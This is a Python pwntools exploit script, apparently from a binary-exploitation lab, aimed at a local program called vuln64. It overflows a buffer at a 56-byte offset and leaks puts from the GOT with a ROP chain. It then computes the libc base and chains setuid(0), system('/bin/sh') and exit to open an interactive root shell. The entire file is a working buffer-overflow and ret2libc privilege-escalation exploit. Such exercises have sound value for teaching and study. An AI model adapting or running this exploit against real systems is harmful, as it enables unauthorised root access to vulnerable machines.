from pwn import *


context.arch = 'amd64' # set runtime variables in a global setting.

#initialize process for pwntools
elf = ELF("../app/vuln64")
p = elf.process(["../app/vuln64" , "h"])

########################################Stage 1 Offset & Memory leak#######################################

#ROP chain using embedded pwn functions which uses files symbols at runtime to extract plt addresses.
rop= ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']]) 		#find puts in procedural link table, print mem address of GOT put
rop.call(elf.sym['helpCommand'])			#return to helpCommand function in program

offset = 56

payload = [
	b"A" * offset,
	rop.chain()

]

payload = b"".join(payload)
p.sendline(payload)
p.recvline()
p.recvline()
puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00")) #store & unpack output. Perform strip
log.info(f"leaked puts@GLIBC found: {hex(puts)}" )	#log output to determine success


############################################Stage 2 Ret2libc##############################################

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")		#specify libc //can be determined by: ldd vuln64 | grep libc
libc.address = puts - libc.symbols["puts"]		#load symbols from libc and perform plt, GOt offset to find base address
log.info(f"libc base address: {hex(libc.address)}" )

binsh = next(libc.search(b"/bin/sh"))			#find /bin/sh address //can use: strings -atx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
rop.call(libc.sym.setuid, [0])				#final ROP chain, call setuid 0 i.e. root, execute /bin/sh, exit gracefully
rop.call(libc.sym.system, [binsh])
rop.call(libc.sym.exit)

payload = [
	b"A" * offset,
	rop.chain()

]

payload = b"".join(payload)				#send payload
p.sendline(payload)
p.recvline()

p.interactive()